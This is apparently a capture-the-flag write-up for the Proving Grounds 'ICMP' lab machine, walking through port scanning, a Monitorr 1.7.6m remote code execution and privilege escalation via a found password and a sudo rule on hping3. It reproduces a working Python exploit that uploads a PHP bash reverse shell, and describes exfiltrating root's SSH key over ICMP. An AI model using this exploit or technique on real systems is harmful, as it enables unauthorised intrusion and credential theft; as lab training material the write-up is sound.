# ICMP

## Background

> Feel free to ping me 

- Author: Fortunato 'foxlox' Lodari

- Released on: Aug 25, 2022

- Difficulty: Intermediate

- Overall difficulty for me: Easy
    - Initial foothold: Very easy
    - Privilege Escalation: Medium

# Service Enumeration

**Rustscan Result:**

As usual, scan the machine for open ports via `rustscan`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a1.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a2.png)

According to `rustscan` result, we have 2 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.9p1 Debian
80                | Apache httpd 2.4.38

## HTTP on Port 80

Always enumerate HTTP first, as it has the largest attack vectors.

**http://192.168.129.218/mon/:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a3.png)

Found `Monitorr 1.7.6m`.

**Searchsploit Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a4.png)

Found 2 exploits!

# Initial Foothold

**Remote Code Execution (`48980.py`):**

- We can mirror the exploit to see what is it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a5.png)

**48980.py:**
```py
import requests
import os
import sys

if len (sys.argv) != 4:
	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

    requests.post(url, headers=headers, data=data)

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/she_ll.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    requests.get(url, headers=headers)
```

The exploit doing a POST request in `/assets/php/upload.php`, and trying to upload a PHP reverse shell called `she_ll.php`. If uploaded, it'll trigger the PHP reverse shell in `/assets/data/usrimg/she_ll.php`.

**Let's setup a `nc` listener and run the exploit!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a6.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a7.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a8.png)

I'm `www-data`!

**local.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a9.png)

**Stable Shell via `socat`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a10.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a11.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a12.png)

# Privilege Escalation

## www-data to fox

Something interesting in `fox`'s home directory?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a13.png)

Also, I found a misconfigured file in `/root`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a14.png)

It's **world-readable**!

**Normal `/root` permission:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a15.png)

Let's check it out!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a16.png)

Can I read his private SSH key?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a17.png)

Nope. Let's go back to `fox`'s home directory.

In his home directory, we also can see there is a directory called `devel`. Plus the `reminder` text file, makes me feel like `crypt.php` is inside the `devel` directory:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a18.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a19.png)

```php
<?php
echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da');
?>
```

Maybe the `BUHNIJMONIBUVCYTTYVGBUHJNI` is user `fox`'s password??

- Username:fox
- Password:BUHNIJMONIBUVCYTTYVGBUHJNI

Let's **Switch User** to `fox`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a20.png)

And we're `fox`!

## fox to root

**Sudo Permission:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a21.png)

As we can see, there are 2 commands we can run as root, and the first command could escalate our privilege to root, as it uses a wildcard:

```bash
/usr/sbin/hping3 --icmp *
/usr/bin/killall hping3
```

Since we must use the ICMP mode, we can't spawn a shell.

BUT, according to a [blog back in 2008](https://www.codebelay.com/blog/2008/10/09/sending-files-with-hping3/), we can use `hping3` to transfer files to other machine. We can try to send root's private SSH key that we've just found.

**To do so, we'll:**

- Setup a `hping3` listener on the **first SSH session**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a22.png)

- Transfer root's private SSH key on the **second SSH session**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a23.png)

- Captured the private SSH key on the **first SSH session**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a24.png)

Let's copy and paste it to our attacker machine, and `ssh` into root:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a25.png)

We're root! :D

# Rooted

**proof.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/ICMP/images/a26.png)

# Conclusion

What we've learned:

1. Remote Code Execution in Monitorr 1.7.6m
2. Privilege Escalation via Found Credentials From `crypt.php` in `/home/fox/devel/`
3. Privilege Escalation via Misconfigured `sudo` Permission to `hping3`